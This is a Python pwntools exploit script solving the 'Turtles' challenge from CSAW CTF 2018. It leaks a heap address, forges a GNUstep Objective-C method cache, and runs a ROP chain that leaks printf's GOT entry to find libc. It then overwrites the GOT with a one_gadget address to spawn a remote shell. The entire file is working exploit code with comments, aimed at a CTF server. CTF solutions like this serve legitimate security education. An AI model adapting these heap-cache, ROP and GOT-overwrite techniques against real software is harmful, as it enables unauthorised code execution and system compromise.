# 
# Turtles CSAW 2018 Solution
#      _____     ____
#     /      \  |  o | 
#    |        |/ ___\| 
#    |_________/     
#    |_|_| |_|_|
#

from pwn import *

context.log_level = "DEBUG"

p = remote("pwn.chal.csaw.io", 9003)
pause()

elf = ELF("turtles")

heap_leak = int(p.recv().split("\n")[0].split(": ")[-1].strip(), 16)
print "[+] Heap Leak: ", hex(heap_leak)

# libc offsets
# magic_libc_offset: found with one_gadget (https://github.com/david942j/one_gadget)
# this magic gadget is equivalent to execve("/bin/sh", 0, envp) which saves us the
# step of having to find/write "/bin/sh" into the progrma
magic_libc_offset = 0x41320 
printf_libc_offset = 0x50cf0

# various rop gadgets found with rp++ (https://github.com/0vercl0k/rp)

# 0x00400ec3: fsave  [rbp-0x16] ; add rsp, 0x08 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  ;
addespppppppr = 0x00400ec6

# 0x00400d5f: pop rax ; ret  ;
prax_r = 0x00400e5f

# 0x00400d43: pop rdi ; ret  ;
prdi_r = 0x00400d43

# 0x00400d41: pop rsi ; pop r15 ; ret  ;
prsi_pr = 0x00400d41

# 0x00400cdb: pop rbp ; ret  ;  (1 found)
prbp_r = 0x00400cdb

# format string for leaking out bytes from program
print_llu = " %500s"
print_llu_int = int("000a" + "".join([hex(ord(c))[2:] for c in print_llu][::-1]), 16)

# payload to be sent to program
# we use our heap leak to setup a fake objc method cache
# an attack which is described here (http://phrack.org/issues/66/4.html)
# but adapted to the cache that gnustep objc dictates. objc_msg_lookup for
# gnustep can be found here:
# (https://github.com/gnustep/libobjc/blob/master/sendmsg.c#L275)
# this does the cache lookup and is ultimately the thing being exploited

# *rdi
payload = p64(heap_leak - 0x40 + 0x8)

# *(*rdi + 0x40)
payload += p64(heap_leak + 0x10)

# *(*(*rdi + 0x40))
payload += p64(heap_leak - 0x320 + 0x40)

payload += p64(print_llu_int)

# 0x00400d3d: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret  ;
payload += p64(0x00400d3d)

payload += p64(heap_leak + 0x50 - (1 * 0x8))

# Null for printf to return 0 bytes written
payload += p64(0)

# *(*(*rdi + 0x40) + 0x28)
payload += p64(0xca0)

payload += p64(heap_leak - 0xa8 + 0x48)

# 0x00400d36: add rsp, 0x08 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14
# ; pop r15 ; ret  ;
payload += p64(0x00400d36)

# we construct our rop chain to:
# 1) Call printf with an empty string to get rax to be 0
# 2) leak out the got address of printf using the format string " %500s"
# 3) read our calculated libc magic address back into the printf got
# 4) call the "printf" function, which is now pointing to code in libc
#    that will spawn a shell for us
memcpy_ow_addr = elf.got['memcpy'] + 0x830
print_llu_addr = heap_leak + (24 * 0x8)
print_null_addr = heap_leak + 0x30
rop_chain = "".join(map(p64, [
        0xdeadbeefcafebabe,
        0x1337133713371337,
	prdi_r,
	print_null_addr,
	elf.plt['printf'], # put 0 in rax
	prdi_r,
	print_llu_addr,
	prsi_pr,
	elf.got['printf'],
	0,
	elf.plt['printf'], # leak bytes
        prbp_r,
        memcpy_ow_addr,
        0x400c43, # 00400c43  lea     rax, [rbp-0x830 {var_838}]
        print_llu_int,
]))

payload += rop_chain

p.send(payload)

# using the leaked got address, calculate the actual address
# of the magic jump
printf_got_leak = u64(p.recv().strip() + "\x00\x00")
libc_base = printf_got_leak - printf_libc_offset
magic_addr = libc_base + magic_libc_offset

p.send(p64(magic_addr))

# wait for our shell
p.interactive()
